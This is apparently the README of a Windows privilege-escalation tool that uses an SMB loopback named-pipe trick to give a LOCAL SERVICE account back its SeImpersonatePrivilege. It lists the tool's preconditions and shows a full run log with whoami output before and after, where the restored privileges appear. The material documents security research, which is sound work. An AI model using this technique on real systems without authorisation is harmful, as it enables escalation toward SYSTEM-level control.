# ImpersonatePrivilegeBack
Give Me Back My Privileges! Please? --Clément Labro.  
Bring me SeImpersonatePrivilege back for __Service Account__.  
Use SMB Loopback technique to bring SeImpersonatePrivilege back instaed of Task Scheduler.  

## The Limition
1: Local SMB 445 port open.  
2: CurrentProcess Token SessionId == RawToken SessionId.  
3: Token ElevatedType no Limited and Token Integrity >= RawToken Integrity.  

## Build Environment  
Visual Studio 2022  
__Relase x64__  

## Test with upnphost service (x64 Only)
__User = NT AUTHORITY\LOCAL SERVICE__   
__SessionId = 0__  
__Token Integrity = System__  
__Elevation = N/A__  
  
<details>
 <summary>Output</summary>

```
C:\Users\Public>ver

Microsoft Windows [Version 10.0.19044.1889]

C:\Users\Public>whoami /all

USER INFORMATION
----------------

User Name                  SID     
========================== ========
nt authority\local service S-1-5-19


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                                                              Attributes                                        
====================================== ================ ================================================================================================ ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                                       
Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
NT SERVICE\upnphost                    Well-known group S-1-5-80-448846144-1414373772-1578130625-718576682-2306699751                                    Enabled by default, Enabled group, Group owner    
LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-1488445330-856673777-1515413738-1380768593-2977925950-2228326386-886087428-2802422674   Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name          Description              State  
======================= ======================== =======
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeCreateGlobalPrivilege Create global objects    Enabled


C:\Users\Public>dir /a
 Volume in drive C has no label.
 Volume Serial Number is DECF-3CD6

 Directory of C:\Users\Public

2022/08/25  11:48    <DIR>          .
2022/08/25  11:48    <DIR>          ..
2022/07/02  15:00    <DIR>          AccountPictures
2019/12/07  17:14    <DIR>          Desktop
2019/12/07  17:12               174 desktop.ini
2022/07/02  14:59    <DIR>          Documents
2019/12/07  17:14    <DIR>          Downloads
2022/08/25  11:51            62,464 ImpersonatePrivilegeBack.exe
2019/12/07  17:31    <DIR>          Libraries
2019/12/07  17:14    <DIR>          Music
2019/12/07  17:14    <DIR>          Pictures
2019/12/07  17:14    <DIR>          Videos
               2 File(s)         62,638 bytes
              10 Dir(s)  36,616,130,560 bytes free

C:\Users\Public>ImpersonatePrivilegeBack.exe
[*] NtOpenProcessTokenEx: 0x00000000, NtCurrentProcessToken = 0x00000000000000CC
[*] NtOpenThreadTokenEx: 0xc000007c, NtCurrentThreadToken = 0x0000000000000000
[*] No SeImpersonatePrivilege, Try to make SeImpersonatePrivilege privilege back!
[*] Note: This Technique require CurrentProcess Token SessionId == RawToken SessionId
[+] CurrentProcessToken is ServiceAccount!
[+] Integrity Level >= System OK!
[*] PipeServer = \??\pipe\wLuoB9qq5qKmXer
[*] NtCreateNamedPipeFile Status = 0x00000000, IoStatus: 0x00000000, IoStatus.Information: 2
[*] NtCreateNamedPipeFile hPipe = 0x00000000000000E4
[*] CustomConnectNamedPipe->NtFsControlFile: 0x00000000
[+] A client connected!
[*] NtCreateFile Status = 0x00000000, IoStatus: 0x00000000, IoStatus.Information: 1
[*] NtOpenThreadTokenEx: 0x00000000, ImpersonateThreadToken = 0x00000000000000E4
[+] Got SeImpersonatePrivilege with SecurityImpersonation!
[*] Bypass SAC (Service Account Control) like UAC Owo
[*] NtDuplicateToken: 0x00000000, PrimaryTokenHandle = 0x00000000000000E8
[*] Exec: cmd.exe /c whoami.exe /all > C:\Users\Public\whoami.txt, IsCreateSucess = 1
[*] Last Win32Error: 0
[*] Last NtstatusError: 0xc0150008
[+] Check C:\Users\Public\whoami.txt

C:\Users\Public>type whoami.txt

USER INFORMATION
----------------

User Name                  SID     
========================== ========
nt authority\local service S-1-5-19


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                                                              Attributes                                        
====================================== ================ ================================================================================================ ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                                       
Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
NT SERVICE\lmhosts                     Well-known group S-1-5-80-172094073-716411664-54255058-185476446-2329512179                                       Enabled by default, Enabled group, Group owner    
LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-1488445330-856673777-1515413738-1380768593-2977925950-2228326386-886087428-2802422674   Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeSystemtimePrivilege         Change the system time                    Enabled
SeShutdownPrivilege           Shut down the system                      Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled


C:\Users\Public>
```

</details>  

__Be aware your CurrentProcess SessionId !__

## References && Credits

1: https://itm4n.github.io/localservice-privileges/  
2: https://decoder.cloud/2020/11/05/hands-off-my-service-account/  
3: https://bugs.chromium.org/p/project-zero/issues/detail?id=2194  
4: https://www.tiraniddo.dev/2021/06/a-little-more-on-task-schedulers.html  
5: https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html  
6: https://windows-internals.com/faxing-your-way-to-system/  
7: https://twitter.com/tiraniddo/status/1254192588392992768  
8: https://github.com/winsiderss/systeminformer  
9: https://github.com/itm4n/FullPowers  
10: https://doxygen.reactos.org/  
11: https://github.com/jiubanlo/WinNT5_src_20201004  
12: https://github.com/diversenok/TokenUniverse  
13: https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html
